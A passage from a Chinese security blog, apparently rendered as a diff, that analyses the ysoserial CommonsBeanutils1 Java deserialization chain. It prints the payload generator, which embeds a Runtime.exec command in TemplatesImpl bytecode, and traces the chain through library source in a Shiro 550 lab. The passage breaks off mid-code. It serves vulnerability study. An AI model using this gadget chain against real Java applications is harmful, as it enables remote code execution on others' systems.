+<li data-nav-id=/zh-cn/vulnerability/zero-logon/ title="Zero Logon 分析" class=dd-item>
+<a href=/zh-cn/vulnerability/zero-logon/>
+Zero Logon 分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/ title="CVE-2022-4223 PgAdmin RCE 分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/>
+CVE-2022-4223 PgAdmin RCE 分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/strapi-rce/ title="Strapi RCE 漏洞链分析" class=dd-item>
+<a href=/zh-cn/vulnerability/strapi-rce/>
+Strapi RCE 漏洞链分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/ title="CVE-2023-23410 Windows HTTP.sys 权限提升漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/>
+CVE-2023-23410 Windows HTTP.sys 权限提升漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2021-3156-sudo-eop/ title="CVE-2021-3156 Sudo 权限提升漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2021-3156-sudo-eop/>
+CVE-2021-3156 Sudo 权限提升漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/ title="CVE-2023-28432 MinIO 信息泄露漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/>
+CVE-2023-28432 MinIO 信息泄露漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-23397-outlook-eop/ title="CVE-2023-23397 Outlook 权限提升漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-23397-outlook-eop/>
+CVE-2023-23397 Outlook 权限提升漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/proxy-not-shell/ title="Proxy Not Shell 利用链分析" class=dd-item>
+<a href=/zh-cn/vulnerability/proxy-not-shell/>
+Proxy Not Shell 利用链分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2021-40449-win32k-eop/ title="CVE-2021-40449 Win32k 权限提升漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2021-40449-win32k-eop/>
+CVE-2021-40449 Win32k 权限提升漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/dailylife/ title=生活随笔 class=dd-item>
+<a href=/zh-cn/dailylife/>
+<b>X. </b>生活随笔
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/dailylife/movies/ title=Movies class=dd-item>
+<a href=/zh-cn/dailylife/movies/>
+<b>X. </b>Movies
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/dailylife/movies/2024-%E6%BD%9C%E8%A1%8C/ title="2024 潜行" class=dd-item>
+<a href=/zh-cn/dailylife/movies/2024-%E6%BD%9C%E8%A1%8C/>
+2024 潜行
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/dailylife/%E5%90%90%E6%A7%BD/ title=吐槽 class=dd-item>
+<a href=/zh-cn/dailylife/%E5%90%90%E6%A7%BD/>
+吐槽
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/dailylife/2023-review-and-2024-outlook/ title=2023年总结和2024年展望 class=dd-item>
+<a href=/zh-cn/dailylife/2023-review-and-2024-outlook/>
+2023年总结和2024年展望
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/misc/ title=杂项 class=dd-item>
+<a href=/zh-cn/misc/>
+<b>X. </b>杂项
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/misc/tools/ title=Tools class=dd-item>
+<a href=/zh-cn/misc/tools/>
+<b>X. </b>Tools
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/misc/tools/citrix-update-monitor/ title="【工具】Citrix NetScaler 更新监控" class=dd-item>
+<a href=/zh-cn/misc/tools/citrix-update-monitor/>
+【工具】Citrix NetScaler 更新监控
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/misc/encoding/ title=Encoding class=dd-item>
+<a href=/zh-cn/misc/encoding/>
+<b>X. </b>Encoding
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/misc/encoding/utf-7/ title="Utf 7" class=dd-item>
+<a href=/zh-cn/misc/encoding/utf-7/>
+Utf 7
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/misc/encoding/unicode/ title=Unicode class=dd-item>
+<a href=/zh-cn/misc/encoding/unicode/>
+Unicode
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/misc/tunnel/ title=隧道 class=dd-item>
+<a href=/zh-cn/misc/tunnel/>
+<b>X. </b>隧道
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/misc/tunnel/application-layer/ title=应用层隧道 class=dd-item>
+<a href=/zh-cn/misc/tunnel/application-layer/>
+<b>X. </b>应用层隧道
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/misc/tunnel/application-layer/ssh-tunnel/ title=SSH隧道 class=dd-item>
+<a href=/zh-cn/misc/tunnel/application-layer/ssh-tunnel/>
+SSH隧道
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/misc/tunnel/transport-layer/ title=传输层隧道 class=dd-item>
+<a href=/zh-cn/misc/tunnel/transport-layer/>
+<b>X. </b>传输层隧道
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/misc/tunnel/transport-layer/socks/ title=Socks隧道 class=dd-item>
+<a href=/zh-cn/misc/tunnel/transport-layer/socks/>
+<b>X. </b>Socks隧道
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/misc/tunnel/network-layer/ title=网络层隧道 class=dd-item>
+<a href=/zh-cn/misc/tunnel/network-layer/>
+<b>X. </b>网络层隧道
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/others/ title=其他 class=dd-item>
+<a href=/zh-cn/others/>
+<b>X. </b>其他
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/others/add-timeline-shortcode/ title=给hugo-theme-learn增加timeline功能 class=dd-item>
+<a href=/zh-cn/others/add-timeline-shortcode/>
+给hugo-theme-learn增加timeline功能
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/others/how-to-reset-password-administrator-on-windows-server-2019/ title="在Windows server 2019上重置密码" class=dd-item>
+<a href=/zh-cn/others/how-to-reset-password-administrator-on-windows-server-2019/>
+在Windows server 2019上重置密码
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/others/vmware-based-implementation-of-small-domain-network-construction/ title=基于Vmware的小型域网络搭建 class=dd-item>
+<a href=/zh-cn/others/vmware-based-implementation-of-small-domain-network-construction/>
+基于Vmware的小型域网络搭建
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+</ul>
+<section id=shortcuts>
+<h3>更多</h3>
+<ul>
+<li>
+<a class=padding href=https://www.ch35tnut.site/zh-cn/about><i class="fas fa-person-booth"></i> 关于</a>
+</li>
+<li>
+<a class=padding href=https://github.com/Chestnut4/><i class="fab fa-github"></i> Github 链接</a>
+</li>
+<li>
+<a class=padding href=https://www.ch35tnut.site/zh-cn/tags><i class="fas fa-tags"></i> 标签</a>
+</li>
+<li>
+<a class=padding href=https://www.ch35tnut.site/zh-cn/index.xml><i class="fas fa-fw fa-link"></i> RSS</a>
+</li>
+</ul>
+</section>
+<section id=prefooter>
+<hr>
+<ul>
+<li>
+<a class=padding>
+<i class="fas fa-language fa-fw"></i>
+<div class=select-style>
+<select id=select-language onchange="location=this.value"><option id=zh-cn value=https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/ selected>简体中文</option></select><svg id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="255" height="255" viewBox="0 0 255 255" style="enable-background:new 0 0 255 255"><g><g id="arrow-drop-down"><polygon points="0,63.75 127.5,191.25 255,63.75"/></g></g></svg>
+</div>
+</a>
+</li>
+<li><a class=padding href=# data-clear-history-toggle><i class="fas fa-history fa-fw"></i> 清理历史记录</a></li>
+</ul>
+</section>
+<section id=footer>
+<center>
+</center>
+<script async defer src=https://buttons.github.io/buttons.js></script>
+</section>
+</div>
+</nav>
+<section id=body>
+<div id=overlay></div>
+<div class="padding highlightable">
+<div>
+<div id=top-bar>
+<div id=breadcrumbs itemscope itemtype=http://data-vocabulary.org/Breadcrumb>
+<span id=sidebar-toggle-span>
+<a href=# id=sidebar-toggle data-sidebar-toggle>
+<i class="fas fa-bars"></i>
+</a>
+</span>
+<span id=toc-menu><i class="fas fa-list-alt"></i></span>
+<span class=links>
+<a href=/zh-cn/>首页</a> > <a href=/zh-cn/research/>安全研究</a> > <a href=/zh-cn/research/web/>Web</a> > <a href=/zh-cn/research/web/java-deserialization/>Java Deserialization</a> > CommonsBeanutils1 Chain
+</span>
+</div>
+<div class=progress>
+<div class=wrapper>
+<nav id=TableOfContents>
+<ul>
+<li>
+<ul>
+<li><a href=#概述>概述</a></li>
+<li><a href=#细节>细节</a></li>
+</ul>
+</li>
+</ul>
+</nav>
+</div>
+</div>
+</div>
+</div>
+<div id=head-tags>
+<div class=tags>
+<a class=tag-link href=/zh-cn/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6>安全研究</a>
+<a class=tag-link href=/zh-cn/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96>反序列化</a>
+</div>
+</div>
+<div id=body-inner>
+<h1>
+CommonsBeanutils1 Chain
+</h1>
+<div class=progress>
+<div class=wrapper>
+</div>
+</div>
+<nav id=TableOfContents>
+<ul>
+<li>
+<ul>
+<li><a href=#概述>概述</a></li>
+<li><a href=#细节>细节</a></li>
+</ul>
+</li>
+</ul>
+</nav>
+<h3 id=概述>概述</h3>
+<p>在ysoserial中实现了<code>CommonsBeanutils1</code>反序列化链，可以利用这个链执行代码。</p>
+<h3 id=细节>细节</h3>
+<p>在ysoserial中实现<code>CommonsBeanutils1</code>代码如下，首先<code>new BeanComparator/PriorityQueue</code>对象，在<code>PriorityQueue</code>对象内添加两个int对象，而后通过反射修改property字段存储的值</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CommonsBeanutils1</span> <span style=color:#66d9ef>implements</span> ObjectPayload<span style=color:#f92672>&lt;</span>Object<span style=color:#f92672>&gt;</span> <span style=color:#f92672>{</span>
+
+	<span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>getObject</span><span style=color:#f92672>(</span><span style=color:#66d9ef>final</span> String command<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
+		<span style=color:#66d9ef>final</span> Object templates <span style=color:#f92672>=</span> Gadgets<span style=color:#f92672>.</span><span style=color:#a6e22e>createTemplatesImpl</span><span style=color:#f92672>(</span>command<span style=color:#f92672>);</span>
+		<span style=color:#75715e>// mock method name until armed
+</span><span style=color:#75715e></span>		<span style=color:#66d9ef>final</span> BeanComparator comparator <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> BeanComparator<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;lowestSetBit&#34;</span><span style=color:#f92672>);</span>
+
+		<span style=color:#75715e>// create queue with numbers and basic comparator
+</span><span style=color:#75715e></span>		<span style=color:#66d9ef>final</span> PriorityQueue<span style=color:#f92672>&lt;</span>Object<span style=color:#f92672>&gt;</span> queue <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> PriorityQueue<span style=color:#f92672>&lt;</span>Object<span style=color:#f92672>&gt;(</span>2<span style=color:#f92672>,</span> comparator<span style=color:#f92672>);</span>
+		<span style=color:#75715e>// stub data for replacement later
+</span><span style=color:#75715e></span>		queue<span style=color:#f92672>.</span><span style=color:#a6e22e>add</span><span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> BigInteger<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;1&#34;</span><span style=color:#f92672>));</span>
+		queue<span style=color:#f92672>.</span><span style=color:#a6e22e>add</span><span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> BigInteger<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;1&#34;</span><span style=color:#f92672>));</span>
+
+		<span style=color:#75715e>// switch method called by comparator
+</span><span style=color:#75715e></span>		Reflections<span style=color:#f92672>.</span><span style=color:#a6e22e>setFieldValue</span><span style=color:#f92672>(</span>comparator<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;property&#34;</span><span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;outputProperties&#34;</span><span style=color:#f92672>);</span>
+
+		<span style=color:#75715e>// switch contents of queue
+</span><span style=color:#75715e></span>		<span style=color:#66d9ef>final</span> Object<span style=color:#f92672>[]</span> queueArray <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>Object<span style=color:#f92672>[])</span> Reflections<span style=color:#f92672>.</span><span style=color:#a6e22e>getFieldValue</span><span style=color:#f92672>(</span>queue<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;queue&#34;</span><span style=color:#f92672>);</span>
+		queueArray<span style=color:#f92672>[</span>0<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> templates<span style=color:#f92672>;</span>
+		queueArray<span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> templates<span style=color:#f92672>;</span>
+
+		<span style=color:#66d9ef>return</span> queue<span style=color:#f92672>;</span>
+	<span style=color:#f92672>}</span>
+
+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> Object <span style=color:#a6e22e>createTemplatesImpl</span><span style=color:#f92672>(</span>String command<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>return</span> Boolean<span style=color:#f92672>.</span><span style=color:#a6e22e>parseBoolean</span><span style=color:#f92672>(</span>System<span style=color:#f92672>.</span><span style=color:#a6e22e>getProperty</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;properXalan&#34;</span><span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;false&#34;</span><span style=color:#f92672>))</span> <span style=color:#f92672>?</span> createTemplatesImpl<span style=color:#f92672>(</span>command<span style=color:#f92672>,</span> Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;org.apache.xalan.xsltc.trax.TemplatesImpl&#34;</span><span style=color:#f92672>),</span> Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;org.apache.xalan.xsltc.runtime.AbstractTranslet&#34;</span><span style=color:#f92672>),</span> Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&#34;</span><span style=color:#f92672>))</span> <span style=color:#f92672>:</span> createTemplatesImpl<span style=color:#f92672>(</span>command<span style=color:#f92672>,</span> TemplatesImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> AbstractTranslet<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> TransformerFactoryImpl<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
+    <span style=color:#f92672>}</span>
+
+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> T <span style=color:#a6e22e>createTemplatesImpl</span><span style=color:#f92672>(</span>String command<span style=color:#f92672>,</span> Class<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> tplClass<span style=color:#f92672>,</span> Class<span style=color:#f92672>&lt;?&gt;</span> abstTranslet<span style=color:#f92672>,</span> Class<span style=color:#f92672>&lt;?&gt;</span> transFactory<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
+        T templates <span style=color:#f92672>=</span> tplClass<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>();</span>
+        ClassPool pool <span style=color:#f92672>=</span> ClassPool<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefault</span><span style=color:#f92672>();</span>
+        pool<span style=color:#f92672>.</span><span style=color:#a6e22e>insertClassPath</span><span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> ClassClassPath<span style=color:#f92672>(</span>StubTransletPayload<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>));</span>
+        pool<span style=color:#f92672>.</span><span style=color:#a6e22e>insertClassPath</span><span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> ClassClassPath<span style=color:#f92672>(</span>abstTranslet<span style=color:#f92672>));</span>
+        CtClass clazz <span style=color:#f92672>=</span> pool<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>StubTransletPayload<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
+        String cmd <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;java.lang.Runtime.getRuntime().exec(\&#34;&#34;</span> <span style=color:#f92672>+</span> command<span style=color:#f92672>.</span><span style=color:#a6e22e>replace</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;\\&#34;</span><span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;\\\\&#34;</span><span style=color:#f92672>).</span><span style=color:#a6e22e>replace</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;\&#34;&#34;</span><span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;\\\&#34;&#34;</span><span style=color:#f92672>)</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;\&#34;);&#34;</span><span style=color:#f92672>;</span>
+        clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>makeClassInitializer</span><span style=color:#f92672>().</span><span style=color:#a6e22e>insertAfter</span><span style=color:#f92672>(</span>cmd<span style=color:#f92672>);</span>
+        clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>setName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;ysoserial.Pwner&#34;</span> <span style=color:#f92672>+</span> System<span style=color:#f92672>.</span><span style=color:#a6e22e>nanoTime</span><span style=color:#f92672>());</span>
+        CtClass superC <span style=color:#f92672>=</span> pool<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>abstTranslet<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
+        clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>setSuperclass</span><span style=color:#f92672>(</span>superC<span style=color:#f92672>);</span>
+        <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> classBytes <span style=color:#f92672>=</span> clazz<span style=color:#f92672>.</span><span style=color:#a6e22e>toBytecode</span><span style=color:#f92672>();</span>
+        Reflections<span style=color:#f92672>.</span><span style=color:#a6e22e>setFieldValue</span><span style=color:#f92672>(</span>templates<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;_bytecodes&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]{</span>classBytes<span style=color:#f92672>,</span> ClassFiles<span style=color:#f92672>.</span><span style=color:#a6e22e>classAsBytes</span><span style=color:#f92672>(</span>Foo<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>)});</span>
+        Reflections<span style=color:#f92672>.</span><span style=color:#a6e22e>setFieldValue</span><span style=color:#f92672>(</span>templates<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;_name&#34;</span><span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;Pwnr&#34;</span><span style=color:#f92672>);</span>
+        Reflections<span style=color:#f92672>.</span><span style=color:#a6e22e>setFieldValue</span><span style=color:#f92672>(</span>templates<span style=color:#f92672>,</span> <span style=color:#e6db74>&#34;_tfactory&#34;</span><span style=color:#f92672>,</span> transFactory<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>());</span>
+        <span style=color:#66d9ef>return</span> templates<span style=color:#f92672>;</span>
+    <span style=color:#f92672>}</span>
+</code></pre></div><p>而后通过反射将PriorityQueue对象存储的两个BigInteger对象改为创建的TemplatesImpl对象。
+<img alt src=/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/1.png></p>
+<p><strong>根因分析</strong>
+根据前面调试知道，<code>CommonsBeanutils1</code>序列化<code>PriorityQueue</code>对象，其中<code>comparator</code>指定为<code>BeanComparator</code>，<code>PriorityQueue</code>内存了两个<code>TemplatesImpl</code>对象。</p>
+<p>使用
 <a href=/zh-cn/vulnerability/cve-2016-4437-shiro-550-rce/>shiro 550</a>环境，发送payload，在调试器中可以看到，首先反序列化<code>PriorityQueue</code>对象
-<img alt src=/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/2.png></p><p>在readObject断点，可以看到尝试反序列化<code>comparator</code>，这里是<code>BeanComparator</code>，并递归反序列化<code>TemplatesImpl</code>
-<img alt src=/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/3.png></p><p>而后readObject会调用heapify方法，跟进调用最后调用到comparator.compare</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>heapify</span>() {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> (size <span style=color:#f92672>&gt;&gt;&gt;</span> 1) <span style=color:#f92672>-</span> 1; i <span style=color:#f92672>&gt;=</span> 0; i<span style=color:#f92672>--</span>)
-</span></span><span style=display:flex><span>            siftDown(i, (E) queue<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span>);
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>siftDown</span>(<span style=color:#66d9ef>int</span> k, E x) {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (comparator <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>)
-</span></span><span style=display:flex><span>            siftDownUsingComparator(k, x);
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>
-</span></span><span style=display:flex><span>            siftDownComparable(k, x);
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>siftDownUsingComparator</span>(<span style=color:#66d9ef>int</span> k, E x) {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> half <span style=color:#f92672>=</span> size <span style=color:#f92672>&gt;&gt;&gt;</span> 1;
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> (k <span style=color:#f92672>&lt;</span> half) {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>int</span> child <span style=color:#f92672>=</span> (k <span style=color:#f92672>&lt;&lt;</span> 1) <span style=color:#f92672>+</span> 1;
-</span></span><span style=display:flex><span>            Object c <span style=color:#f92672>=</span> queue<span style=color:#f92672>[</span>child<span style=color:#f92672>]</span>;
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>int</span> right <span style=color:#f92672>=</span> child <span style=color:#f92672>+</span> 1;
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (right <span style=color:#f92672>&lt;</span> size <span style=color:#f92672>&amp;&amp;</span>
-</span></span><span style=display:flex><span>                comparator.<span style=color:#a6e22e>compare</span>((E) c, (E) queue<span style=color:#f92672>[</span>right<span style=color:#f92672>]</span>) <span style=color:#f92672>&gt;</span> 0)
-</span></span><span style=display:flex><span>                c <span style=color:#f92672>=</span> queue<span style=color:#f92672>[</span>child <span style=color:#f92672>=</span> right<span style=color:#f92672>]</span>;
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (comparator.<span style=color:#a6e22e>compare</span>(x, (E) c) <span style=color:#f92672>&lt;=</span> 0)
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>;
-</span></span><span style=display:flex><span>            queue<span style=color:#f92672>[</span>k<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> c;
-</span></span><span style=display:flex><span>            k <span style=color:#f92672>=</span> child;
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>        queue<span style=color:#f92672>[</span>k<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> x;
-</span></span><span style=display:flex><span>    }
-</span></span></code></pre></div><p>BeanComparator实现了Comparator接口，compare方法代码如下，其会调用getProperty方法，前面在ysoserial中property被设置为outputProperities</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>compare</span>(T o1, T o2) {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>property</span> <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>internalCompare</span>(o1, o2);
-</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span> {
-</span></span><span style=display:flex><span>                Object value1 <span style=color:#f92672>=</span> PropertyUtils.<span style=color:#a6e22e>getProperty</span>(o1, <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>property</span>);
-</span></span><span style=display:flex><span>                Object value2 <span style=color:#f92672>=</span> PropertyUtils.<span style=color:#a6e22e>getProperty</span>(o2, <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>property</span>);
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>internalCompare</span>(value1, value2);
-</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>catch</span> (IllegalAccessException var5) {
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException(<span style=color:#e6db74>&#34;IllegalAccessException: &#34;</span> <span style=color:#f92672>+</span> var5.<span style=color:#a6e22e>toString</span>());
-</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>catch</span> (InvocationTargetException var6) {
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException(<span style=color:#e6db74>&#34;InvocationTargetException: &#34;</span> <span style=color:#f92672>+</span> var6.<span style=color:#a6e22e>toString</span>());
-</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>catch</span> (NoSuchMethodException var7) {
-</span></span><span style=display:flex><span>                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException(<span style=color:#e6db74>&#34;NoSuchMethodException: &#34;</span> <span style=color:#f92672>+</span> var7.<span style=color:#a6e22e>toString</span>());
-</span></span><span style=display:flex><span>            }
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>    }
-</span></span></code></pre></div><p><img alt src=/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/4.png></p><p>跟进getProperty方法内，其中bean为<code>TemplatesImpl</code>对象，会进入<code>bean = this.getSimpleProperty(bean, name);</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> Object <span style=color:#a6e22e>getProperty</span>(Object bean, String name) <span style=color:#66d9ef>throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException {
